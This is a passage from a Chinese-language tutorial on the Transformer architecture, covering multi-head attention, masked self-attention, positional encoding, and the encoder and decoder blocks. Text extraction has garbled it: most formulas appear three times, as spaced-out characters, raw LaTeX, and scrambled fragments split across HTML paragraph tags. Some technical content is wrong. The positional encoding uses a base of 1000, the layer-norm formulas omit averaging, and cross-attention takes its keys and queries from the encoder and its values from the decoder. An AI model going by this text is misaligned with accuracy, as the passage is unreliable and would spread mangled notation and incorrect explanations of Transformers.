\\mathrm{Key}Key向量计算对应的注意力得分，其中注意力向量&alpha; i h \\alpha^{ih}&alpha;&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;的第l ll个分量的计算公式为</p>\n<p>&alpha; l i h = ( q i h ) ⊤ &sdot; k l h , i &isin; { 1 , 2 , 3 } , h &isin; { 1 , 2 } , l &isin; { 1 , 2 , 3 } \\alpha^{ih}_l=(q^{ih})^{\\top}\\cdot k^{lh},\\quad i\\in\\{1,2,3\\},h\\in\\{1,2\\},l\\in\\{1,2,3\\}</p>\n<p>&alpha;&nbsp;</p>\n<p>l</p>\n<p>ih</p>\n<p>​</p>\n<p>&nbsp;=(q&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;)&nbsp;</p>\n<p>⊤</p>\n<p>&nbsp;&sdot;k&nbsp;</p>\n<p>lh</p>\n<p>&nbsp;,i&isin;{1,2,3},h&isin;{1,2},l&isin;{1,2,3}</p>\n<p>令注意力分数矩阵&Lambda; 1 = ( &alpha; 11 , &alpha; 21 , &alpha; 31 ) \\Lambda^1=(\\alpha^{11},\\alpha^{21},\\alpha^{31})&Lambda;&nbsp;</p>\n<p>1</p>\n<p>&nbsp;=(&alpha;&nbsp;</p>\n<p>11</p>\n<p>&nbsp;,&alpha;&nbsp;</p>\n<p>21</p>\n<p>&nbsp;,&alpha;&nbsp;</p>\n<p>31</p>\n<p>&nbsp;)，&Lambda; 2 = ( &alpha; 12 , &alpha; 22 , &alpha; 32 ) \\Lambda^2=(\\alpha^{12},\\alpha^{22},\\alpha^{32})&Lambda;&nbsp;</p>\n<p>2</p>\n<p>&nbsp;=(&alpha;&nbsp;</p>\n<p>12</p>\n<p>&nbsp;,&alpha;&nbsp;</p>\n<p>22</p>\n<p>&nbsp;,&alpha;&nbsp;</p>\n<p>32</p>\n<p>&nbsp;)，则有</p>\n<p>&Lambda; 1 = ( K 1 ) ⊤ &sdot; Q 1 d m , &Lambda; 2 = ( K 2 ) ⊤ &sdot; Q 2 d m \\Lambda^{1}=\\frac{(K^1)^{\\top}\\cdot Q^1}{\\sqrt{d_m}},\\quad\\Lambda^{2}=\\frac{(K^2)^{\\top}\\cdot Q^2}{\\sqrt{d_m}}</p>\n<p>&Lambda;&nbsp;</p>\n<p>1</p>\n<p>&nbsp;=&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>(K&nbsp;</p>\n<p>1</p>\n<p>&nbsp;)&nbsp;</p>\n<p>⊤</p>\n<p>&nbsp;&sdot;Q&nbsp;</p>\n<p>1</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;,&Lambda;&nbsp;</p>\n<p>2</p>\n<p>&nbsp;=&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>(K&nbsp;</p>\n<p>2</p>\n<p>&nbsp;)&nbsp;</p>\n<p>⊤</p>\n<p>&nbsp;&sdot;Q&nbsp;</p>\n<p>2</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>注意分数向量&alpha; i h \\alpha^{ih}&alpha;&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;经过s o f t m a x \\mathrm{softmax}softmax层得到归一化后的注意力分布&beta; i h \\beta^{ih}&beta;&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;，即为</p>\n<p>&beta; j i h = e &alpha; j i h &sum; n = 1 3 e &alpha; n i h , i , j = { 1 , 2 , 3 } , h = { 1 , 2 } \\beta^{ih}_j = \\frac{e^{\\alpha^{ih}_j}}{\\sum\\limits_{n=1}^3e^{\\alpha^{ih}_n}},\\quad i,j=\\{1,2,3\\}, h=\\{1,2\\}</p>\n<p>&beta;&nbsp;</p>\n<p>j</p>\n<p>ih</p>\n<p>​</p>\n<p>&nbsp;=&nbsp;</p>\n<p>n=1</p>\n<p>&sum;</p>\n<p>3</p>\n<p>​</p>\n<p>&nbsp;e&nbsp;</p>\n<p>&alpha;&nbsp;</p>\n<p>n</p>\n<p>ih</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>e&nbsp;</p>\n<p>&alpha;&nbsp;</p>\n<p>j</p>\n<p>ih</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;,i,j={1,2,3},h={1,2}</p>\n<p>对于每一个H e a d \\mathrm{Head}Head利用得到的注意力分布向量&beta; i h \\beta^{ih}&beta;&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;和V a l u e \\mathrm{Value}Value矩阵V h V^hV&nbsp;</p>\n<p>h</p>\n<p>&nbsp;获得最后的输出b i h &isin; R d l 2 &times; 1 b^{ih}\\in \\mathbb{R}^{\\frac{d_l}{2} \\times 1}b&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>2</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&times;1</p>\n<p>&nbsp;，则有</p>\n<p>b i h = &sum; l = 1 3 &beta; l i h &sdot; v l h , i &isin; { 1 , 2 , 3 } , h &isin; { 1 , 2 } b^{ih}=\\sum\\limits^{3}_{l=1}\\beta^{ih}_l \\cdot v^{lh},\\quad i \\in \\{1,2,3\\}, h\\in\\{1,2\\}</p>\n<p>b&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;=&nbsp;</p>\n<p>l=1</p>\n<p>&sum;</p>\n<p>3</p>\n<p>​</p>\n<p>&nbsp;&beta;&nbsp;</p>\n<p>l</p>\n<p>ih</p>\n<p>​</p>\n<p>&nbsp;&sdot;v&nbsp;</p>\n<p>lh</p>\n<p>&nbsp;,i&isin;{1,2,3},h&isin;{1,2}</p>\n<p>两个H e a d \\mathrm{Head}Head的b i h b^{ih}b&nbsp;</p>\n<p>ih</p>\n<p>&nbsp;的向量按照如下方式拼接在一起，则有</p>\n<p>B = ( b 11 b 21 b 31 b 12 b 22 b 32 ) &isin; R d l &times; 3 B=\\left(</p>\n<p>b11b12b21b22b31b32</p>\n<p>b11b21b31b12b22b32</p>\n<p>\\right)\\in \\mathbb{R}^{d_l \\times 3}</p>\n<p>B=(&nbsp;</p>\n<p>b&nbsp;</p>\n<p>11</p>\n<p>&nbsp;</p>\n<p>b&nbsp;</p>\n<p>12</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>b&nbsp;</p>\n<p>21</p>\n<p>&nbsp;</p>\n<p>b&nbsp;</p>\n<p>22</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>b&nbsp;</p>\n<p>31</p>\n<p>&nbsp;</p>\n<p>b&nbsp;</p>\n<p>32</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;)&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;</p>\n<p>给定参数矩阵W O &isin; R d l &times; d l W^{O}\\in \\mathbb{R}^{d_l\\times d_l}W&nbsp;</p>\n<p>O</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;，则输出矩阵为</p>\n<p>O = W O &sdot; B &isin; R d l &times; 3 O=W^{O}\\cdot B\\in \\mathbb{R}^{d_l \\times 3}</p>\n<p>O=W&nbsp;</p>\n<p>O</p>\n<p>&nbsp;&sdot;B&isin;R&nbsp;</p>\n<p>d&nbsp;</p>\n<p>l</p>\n<p>​</p>\n<p>&nbsp;&times;3</p>\n<p>&nbsp;</p>\n<p>综上所述则有</p>\n<p>O = M u l t i H e a d ( Q , K , V ) = W O &sdot; C o n c a t ( V 1 &sdot; s o f t m a x ( ( K 1 ) ⊤ &sdot; Q 1 d m ) V 2 &sdot; s o f t m a x ( ( K 2 ) ⊤ &sdot; Q 2 d m ) ) O=\\mathrm{MultiHead}(Q,K,V)=W^O\\cdot\\mathrm{Concat}\\left(</p>\n<p>V1&sdot;softmax((K1)⊤&sdot;Q1dm&radic;)V2&sdot;softmax((K2)⊤&sdot;Q2dm&radic;)</p>\n<p>V1&sdot;softmax((K1)⊤&sdot;Q1dm)V2&sdot;softmax((K2)⊤&sdot;Q2dm)</p>\n<p>\\right)</p>\n<p>O=MultiHead(Q,K,V)=W&nbsp;</p>\n<p>O</p>\n<p>&nbsp;&sdot;Concat&nbsp;</p>\n<p>⎝</p>\n<p>⎜</p>\n<p>⎜</p>\n<p>⎛</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>V&nbsp;</p>\n<p>1</p>\n<p>&nbsp;&sdot;softmax(&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>(K&nbsp;</p>\n<p>1</p>\n<p>&nbsp;)&nbsp;</p>\n<p>⊤</p>\n<p>&nbsp;&sdot;Q&nbsp;</p>\n<p>1</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;)</p>\n<p>V&nbsp;</p>\n<p>2</p>\n<p>&nbsp;&sdot;softmax(&nbsp;</p>\n<p>d&nbsp;</p>\n<p>m</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>(K&nbsp;</p>\n<p>2</p>\n<p>&nbsp;)&nbsp;</p>\n<p>⊤</p>\n<p>&nbsp;&sdot;Q&nbsp;</p>\n<p>2</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;)</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>⎠</p>\n<p>⎟</p>\n<p>⎟</p>\n<p>⎞</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>Mask Self-Attention</p>\n<p>&emsp; 如下图左半部分所示，S e l f \\mathrm{Self}Self-A t t e n t i o n \\mathrm{Attention}Attention的输出向量b i , i &isin; { 1 , 2 , 3 , 4 } b^i, i \\in \\{1,2,3,4\\}b&nbsp;</p>\n<p>i</p>\n<p>&nbsp;,i&isin;{1,2,3,4}综合了输入向量a i , i &isin; { 1 , 2 , 3 , 4 } a^i, i \\in \\{1,2,3,4\\}a&nbsp;</p>\n<p>i</p>\n<p>&nbsp;,i&isin;{1,2,3,4}的全部信息，由此可见，S e l f \\mathrm{Self}Self-A t t e n t i o n \\mathrm{Attention}Attention在实际编程中支持并行运算。如下图右半部分所示，M a s k&nbsp; &nbsp;S e l f \\mathrm{Mask \\text{ } Self}Mask Self-A t t e n t i o n \\mathrm{Attention}Attention的输出向量b i b^ib&nbsp;</p>\n<p>i</p>\n<p>&nbsp;只利用了已知部分输入的向量a i a^ia&nbsp;</p>\n<p>i</p>\n<p>&nbsp;的信息。例如，b 1 b1b1只是与a 1 a^1a&nbsp;</p>\n<p>1</p>\n<p>&nbsp;有关；b 2 b^2b&nbsp;</p>\n<p>2</p>\n<p>&nbsp;与a 1 a^1a&nbsp;</p>\n<p>1</p>\n<p>&nbsp;和a 2 a^2a&nbsp;</p>\n<p>2</p>\n<p>&nbsp;有关；b 3 b^3b&nbsp;</p>\n<p>3</p>\n<p>&nbsp;与a 1 a^1a&nbsp;</p>\n<p>1</p>\n<p>&nbsp;，a 2 a^2a&nbsp;</p>\n<p>2</p>\n<p>&nbsp;和a 3 a^3a&nbsp;</p>\n<p>3</p>\n<p>&nbsp;有关；b 4 b^4b&nbsp;</p>\n<p>4</p>\n<p>&nbsp;与a 1 a^1a&nbsp;</p>\n<p>1</p>\n<p>&nbsp;，a 2 a^2a&nbsp;</p>\n<p>2</p>\n<p>&nbsp;，a 3 a^3a&nbsp;</p>\n<p>3</p>\n<p>&nbsp;和a 4 a^4a&nbsp;</p>\n<p>4</p>\n<p>&nbsp;有关。M a s k&nbsp; &nbsp;S e l f \\mathrm{Mask \\text{ } Self}Mask Self-A t t e n t i o n \\mathrm{Attention}Attention在T r a n s f o r m e r \\mathrm{Transformer}Transformer中被用到过两次。</p>\n<p>&nbsp;</p>\n<p>T r a n s f o r m e r \\mathrm{Transformer}Transformer的E n c o d e r \\mathrm{Encoder}Encoder中如果输入一句话的w o r d \\mathrm{word}word长度小于指定的长度，为了能够让长度一致往往会用0 00进行填充，此时则需要用M a s k&nbsp; &nbsp;S e l f \\mathrm{Mask \\text{ } Self}Mask Self-A t t e n t i o n \\mathrm{Attention}Attention来计算注意力分布。</p>\n<p>T r a n s f o r m e r \\mathrm{Transformer}Transformer的D e c o d e r \\mathrm{Decoder}Decoder的输出是有时序关系的，当前的输出只与之前的输入有关，所以此时算注意力分布时需要用到M a s k&nbsp; &nbsp;S e l f \\mathrm{Mask \\text{ } Self}Mask Self-A t t e n t i o n \\mathrm{Attention}Attention。</p>\n<p>&nbsp;</p>\n<p>Transformer模型</p>\n<p>&emsp;以上对T r a n s f o r m e r \\mathrm{Transformer}Transformer中的核心内容即自注意力机制进行了详细解剖，接下来会对T r a n s f o r m e r \\mathrm{Transformer}Transformer模型架构进行介绍。T r a n s f o r m e r \\mathrm{Transformer}Transformer模型是由E n c o d e r \\mathrm{Encoder}Encoder和D e c o d e r \\mathrm{Decoder}Decoder两个模块组成，具体的示意图如下所示，为了能够对T r a n s f o r m e r \\mathrm{Transformer}Transformer内部的操作细节进行更清晰的展示，下图以矩阵运算的视角对T r a n s f o r m e r \\mathrm{Transformer}Transformer的原理进行讲解。</p>\n<p>&emsp;E n c o d e r \\mathrm{Encoder}Encoder模块操作的具体流程如下所示：</p>\n<p>&nbsp;</p>\n<p>E n c o d e r \\mathrm{Encoder}Encoder的输入由两部分组成分别是词编码矩阵I &isin; R n &times; l &times; d I \\in \\mathbb{R}^{n \\times l \\times d}I&isin;R&nbsp;</p>\n<p>n&times;l&times;d</p>\n<p>&nbsp;和位置编码矩阵P &isin; R n &times; l &times; d P \\in \\mathbb{R}^{n \\times l \\times d}P&isin;R&nbsp;</p>\n<p>n&times;l&times;d</p>\n<p>&nbsp;，其中n nn表示句子数目，l ll表示一句话单词的最大数目，d dd表示的是词向量的维度。位置编码矩阵P PP表示的是每个单词在一句里的所有位置信息，因为S e l f \\mathrm{Self}Self-A t t e n t i o n \\mathrm{Attention}Attention计算注意力分布的时候只能给出输出向量和输入向量之间的权重关系，但是不能给出词在一句话里的位置信息，所以需要在输入里引入位置编码矩阵P PP。位置编码向量生成方法有很多。一种比较简单粗暴的方式就是根据单词在句子中的位置生成一个o n e \\mathrm{one}one-h o t \\mathrm{hot}hot的位置编码；还有的方法是将位置编码当成参数进行训练学习；在该论文里是利用三角函数对位置进行编码，具体的公式如下所示</p>\n<p>P E ( p o s , 2 i ) = sin ⁡ ( p o s 100 0 2 i / d ) , P E ( p o s , 2 i + 1 ) = cos ⁡ ( p o s 100 0 2 i / d ) \\mathrm{PE}(pos,2i)=\\sin(\\frac{pos}{1000^{2i/d}}),\\quad \\mathrm{PE}(pos,2i+1)=\\cos(\\frac{pos}{1000^{2i/d}})</p>\n<p>PE(pos,2i)=sin(&nbsp;</p>\n<p>1000&nbsp;</p>\n<p>2i/d</p>\n<p>&nbsp;</p>\n<p>pos</p>\n<p>​</p>\n<p>&nbsp;),PE(pos,2i+1)=cos(&nbsp;</p>\n<p>1000&nbsp;</p>\n<p>2i/d</p>\n<p>&nbsp;</p>\n<p>pos</p>\n<p>​</p>\n<p>&nbsp;)</p>\n<p>其中P E \\mathrm{PE}PE表示的是位置编码向量，p o s pospos表示词在句子中的位置，i ii表示编码向量的位置索引。</p>\n<p>输入矩阵I + P I+PI+P通过线性变换生成矩阵Q QQ，K KK，V VV。在实际编程中是将输入I + P I+PI+P直接赋值给Q QQ，K KK，V VV。如果输入单词长度小于最大长度并0 00来填充的时候，还要相应引入M a s k \\mathrm{Mask}Mask矩阵。</p>\n<p>将矩阵Q QQ，K KK，V VV输入到M u l t i \\mathrm{Multi}Multi-H e a d&nbsp; &nbsp;A t t e n t i o n \\mathrm{Head\\text{ }Attention}Head Attention模块中进行注意分布的计算得到矩阵I &prime; &isin; R n &times; l &times; d I^{\\prime}\\in \\mathbb{R}^{n \\times l \\times d}I&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>n&times;l&times;d</p>\n<p>&nbsp;，计算公式为</p>\n<p>I &prime; = M u l t i H e a d ( Q , K , V ) I^{\\prime}=\\mathrm{MultiHead}(Q,K,V)</p>\n<p>I&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;=MultiHead(Q,K,V)</p>\n<p>具体的计算细节参考上文关于M u l t i \\mathrm{Multi}Multi-H e a d&nbsp; &nbsp;A t t e n t i o n \\mathrm{Head\\text{ }Attention}Head Attention原理的讲解不在这里赘述。然后将原始输入I + P I+PI+P与注意力分布I &prime; I^{\\prime}I&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;进行残差计算得到输出矩阵I + P + I &prime; &isin; R n &times; l &times; d I+P+I^{\\prime}\\in \\mathbb{R}^{n \\times l \\times d}I+P+I&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>n&times;l&times;d</p>\n<p>&nbsp;。</p>\n<p>对矩阵I + P + I &prime; = { x i j k } n l d I+P+I^{\\prime}=\\{x_{ijk}\\}^{nld}I+P+I&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;={x&nbsp;</p>\n<p>ijk</p>\n<p>​</p>\n<p>&nbsp;}&nbsp;</p>\n<p>nld</p>\n<p>&nbsp;进行层归一化操作得到I &prime; &prime; &isin; R n &times; l &times; d I^{\\prime\\prime}\\in\\mathbb{R}^{n \\times l \\times d}I&nbsp;</p>\n<p>&prime;&prime;</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>n&times;l&times;d</p>\n<p>&nbsp;，具体的计算公式为</p>\n<p>{ &mu; i j = &sum; k = 1 d x i j k &sigma; i j = &sum; k = 1 d ( x i j k &minus; &mu; i j ) 2 ⟹ x ^ i j k = x i j k &minus; u i j &sigma; i j , i &isin; { 1 , ⋯ &thinsp; , n } , j &isin; { 1 , ⋯ &thinsp; , l } , k &isin; { 1 , ⋯ &thinsp; , d } \\left\\{</p>\n<p>&mu;ij&sigma;ij=&sum;k=1dxijk=&sum;k=1d(xijk&minus;&mu;ij)2&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;&minus;⎷</p>\n<p>&mu;ij=&sum;k=1dxijk&sigma;ij=&sum;k=1d(xijk&minus;&mu;ij)2</p>\n<p>\\right. \\Longrightarrow \\hat{x}_{ijk}=\\frac{x_{ijk}-u^{ij}}{\\sigma^{ij}},\\quad i\\in\\{1,\\cdots,n\\},j\\in\\{1,\\cdots,l\\},k\\in\\{1,\\cdots,d\\}</p>\n<p>⎩</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎨</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎪</p>\n<p>⎧</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>&mu;&nbsp;</p>\n<p>ij</p>\n<p>&nbsp;</p>\n<p>&sigma;&nbsp;</p>\n<p>ij</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;&nbsp;</p>\n<p>=&nbsp;</p>\n<p>k=1</p>\n<p>&sum;</p>\n<p>d</p>\n<p>​</p>\n<p>&nbsp;x&nbsp;</p>\n<p>ijk</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>=&nbsp;</p>\n<p>k=1</p>\n<p>&sum;</p>\n<p>d</p>\n<p>​</p>\n<p>&nbsp;(x&nbsp;</p>\n<p>ijk</p>\n<p>​</p>\n<p>&nbsp;&minus;&mu;&nbsp;</p>\n<p>ij</p>\n<p>&nbsp;)&nbsp;</p>\n<p>2</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;⟹&nbsp;</p>\n<p>x</p>\n<p>^</p>\n<p>&nbsp;&nbsp;</p>\n<p>ijk</p>\n<p>​</p>\n<p>&nbsp;=&nbsp;</p>\n<p>&sigma;&nbsp;</p>\n<p>ij</p>\n<p>&nbsp;</p>\n<p>x&nbsp;</p>\n<p>ijk</p>\n<p>​</p>\n<p>&nbsp;&minus;u&nbsp;</p>\n<p>ij</p>\n<p>&nbsp;</p>\n<p>​</p>\n<p>&nbsp;,i&isin;{1,⋯,n},j&isin;{1,⋯,l},k&isin;{1,⋯,d}</p>\n<p>将I &prime; &prime; I^{\\prime\\prime}I&nbsp;</p>\n<p>&prime;&prime;</p>\n<p>&nbsp;输入到全连接神经网络中得到I &prime; &prime; &prime; &isin; R n &times; l &times; d I^{\\prime\\prime\\prime}\\in \\mathbb{R}^{n \\times l \\times d}I&nbsp;</p>\n<p>&prime;&prime;&prime;</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>n&times;l&times;d</p>\n<p>&nbsp; ，然后再让全连接神经网络的输入I &prime; &prime; I^{\\prime\\prime}I&nbsp;</p>\n<p>&prime;&prime;</p>\n<p>&nbsp;与输出I &prime; &prime; &prime; I^{\\prime\\prime\\prime}I&nbsp;</p>\n<p>&prime;&prime;&prime;</p>\n<p>&nbsp;进行残差计算得到I &prime; &prime; + I &prime; &prime; &prime; I^{\\prime\\prime}+I^{\\prime\\prime\\prime}I&nbsp;</p>\n<p>&prime;&prime;</p>\n<p>&nbsp;+I&nbsp;</p>\n<p>&prime;&prime;&prime;</p>\n<p>&nbsp;，接着对I &prime; &prime; + I &prime; &prime; &prime; I^{\\prime\\prime}+I^{\\prime\\prime\\prime}I&nbsp;</p>\n<p>&prime;&prime;</p>\n<p>&nbsp;+I&nbsp;</p>\n<p>&prime;&prime;&prime;</p>\n<p>&nbsp;进行层归一化操作。</p>\n<p>以上是一个B l o c k \\mathrm{Block}Block的操作原理，将N NN个B l o c k \\mathrm{Block}Block进行堆叠就组成了E n c o d e r \\mathrm{Encoder}Encoder的模块，得到的最后输出为I N &isin; R n &times; l &times; d I^N \\in \\mathbb{R}^{n \\times l \\times d}I&nbsp;</p>\n<p>N</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>n&times;l&times;d</p>\n<p>&nbsp;。这里需要注意的是E n c o d e r \\mathrm{Encoder}Encoder模块中的各个组件的操作顺序并不是固定的，也可以先进行归一化操作，然后再计算注意力分布，再归一化，再预测等。</p>\n<p>&emsp;D e c o d e r \\mathrm{Decoder}Decoder模块操作的具体流程如下所示：</p>\n<p>&nbsp;</p>\n<p>D e c o d e r \\mathrm{Decoder}Decoder的输入也由两部分组成分别是词编码矩阵O &isin; R n 1 &times; l 1 &times; d O \\in \\mathbb{R}^{n_1 \\times l_1 \\times d}O&isin;R&nbsp;</p>\n<p>n&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;l&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;d</p>\n<p>&nbsp;和位置编码矩阵P O &isin; R n 1 &times; l 1 &times; d P^O \\in \\mathbb{R}^{n_1 \\times l_1 \\times d}P&nbsp;</p>\n<p>O</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>n&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;l&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;d</p>\n<p>&nbsp;。因为D e c o d e r \\mathrm{Decoder}Decoder的输入是具有时顺序关系的（即上一步的输出为当前步输入）所以还需要输入M a s k \\mathrm{Mask}Mask矩阵M MM以便计算注意力分布。</p>\n<p>输入矩阵O + P O O+P^OO+P&nbsp;</p>\n<p>O</p>\n<p>&nbsp;通过线性变换生成矩阵Q ^ \\hat{Q}&nbsp;</p>\n<p>Q</p>\n<p>^</p>\n<p>​</p>\n<p>&nbsp;，K ^ \\hat{K}&nbsp;</p>\n<p>K</p>\n<p>^</p>\n<p>&nbsp;，V ^ \\hat{V}&nbsp;</p>\n<p>V</p>\n<p>^</p>\n<p>&nbsp;。在实际编程中是将输入O + P O O+P^OO+P&nbsp;</p>\n<p>O</p>\n<p>&nbsp;直接赋值给Q ^ \\hat{Q}&nbsp;</p>\n<p>Q</p>\n<p>^</p>\n<p>​</p>\n<p>&nbsp;，K ^ \\hat{K}&nbsp;</p>\n<p>K</p>\n<p>^</p>\n<p>&nbsp;，V ^ \\hat{V}&nbsp;</p>\n<p>V</p>\n<p>^</p>\n<p>&nbsp;。如果输入单词长度小于最大长度并0 00来填充的时候，还要相应引入M a s k \\mathrm{Mask}Mask矩阵。</p>\n<p>将矩阵Q ^ \\hat{Q}&nbsp;</p>\n<p>Q</p>\n<p>^</p>\n<p>​</p>\n<p>&nbsp;，K ^ \\hat{K}&nbsp;</p>\n<p>K</p>\n<p>^</p>\n<p>&nbsp;，V ^ \\hat{V}&nbsp;</p>\n<p>V</p>\n<p>^</p>\n<p>&nbsp;以及M a s k \\mathrm{Mask}Mask矩阵M MM输入到M a s k&nbsp; &nbsp;M u l t i \\mathrm{Mask\\text{ }Multi}Mask Multi-H e a d&nbsp; &nbsp;A t t e n t i o n \\mathrm{Head\\text{ }Attention}Head Attention模块中进行注意分布的计算得到矩阵O &prime; &isin; R n 1 &times; l 1 &times; d O^{\\prime}\\in \\mathbb{R}^{n_1 \\times l_1 \\times d}O&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>n&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;l&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;d</p>\n<p>&nbsp;，计算公式为</p>\n<p>O &prime; = M a s k M u l t i H e a d ( Q ^ , K ^ , V ^ , M ) O^{\\prime}=\\mathrm{MaskMultiHead}(\\hat{Q},\\hat{K},\\hat{V},M)</p>\n<p>O&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;=MaskMultiHead(&nbsp;</p>\n<p>Q</p>\n<p>^</p>\n<p>​</p>\n<p>&nbsp;,&nbsp;</p>\n<p>K</p>\n<p>^</p>\n<p>&nbsp;,&nbsp;</p>\n<p>V</p>\n<p>^</p>\n<p>&nbsp;,M)</p>\n<p>具体的计算细节参考上文关于M a s k&nbsp; &nbsp;S e l f \\mathrm{Mask \\text{ }Self}Mask Self-A t t e n t i o n \\mathrm{Attention}Attention的讲解不在这里赘述。然后将原始输入O + P O O+P^OO+P&nbsp;</p>\n<p>O</p>\n<p>&nbsp;与注意力分布O &prime; O^{\\prime}O&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;进行残差计算得到输出矩阵O + P O + O &prime; &isin; R n 1 &times; l 1 &times; d O+P^O+O^{\\prime}\\in \\mathbb{R}^{n_1 \\times l_1 \\times d}O+P&nbsp;</p>\n<p>O</p>\n<p>&nbsp;+O&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>n&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;l&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;d</p>\n<p>&nbsp;。接着再对矩阵O + P O + O &prime; O+P^O+O^{\\prime}O+P&nbsp;</p>\n<p>O</p>\n<p>&nbsp;+O&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;进行层归一化操作得到O &prime; &prime; &isin; R n 1 &times; l 1 &times; d O^{\\prime\\prime}\\in\\mathbb{R}^{n_1 \\times l_1 \\times d}O&nbsp;</p>\n<p>&prime;&prime;</p>\n<p>&nbsp;&isin;R&nbsp;</p>\n<p>n&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;l&nbsp;</p>\n<p>1</p>\n<p>​</p>\n<p>&nbsp;&times;d</p>\n<p>&nbsp;。</p>\n<p>E n c o d e r \\mathrm{Encoder}Encoder的输出I N I^NI&nbsp;</p>\n<p>N</p>\n<p>&nbsp;通过线性变换得到Q N Q^NQ&nbsp;</p>\n<p>N</p>\n<p>&nbsp;和K N K^NK&nbsp;</p>\n<p>N</p>\n<p>&nbsp;，O &prime; O^{\\prime}O&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;进行线性变换得到V ^ &prime; \\hat{V}^{\\prime}&nbsp;</p>\n<p>V</p>\n<p>^</p>\n<p>&nbsp;&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;，利用矩阵Q N Q^NQ&nbsp;</p>\n<p>N</p>\n<p>&nbsp;和K N K^NK&nbsp;</p>\n<p>N</p>\n<p>&nbsp;和V ^ &prime; \\hat{V}^{\\prime}&nbsp;</p>\n<p>V</p>\n<p>^</p>\n<p>&nbsp;&nbsp;</p>\n<p>&prime;</p>\n<p>&nbsp;进行交叉注意力分布的计算得到O &prime; &prime; &prime; O^{\\prime\\prime\\prime}O&nbsp;</p>\n<p>&prime;&prime;&prime;</p>\n<p>&nbsp;，计算公式为</p>\n<p>O &prime; &prime; &prime; = M u l t i H e a d ( Q N , K N , V ^ &prime; ) 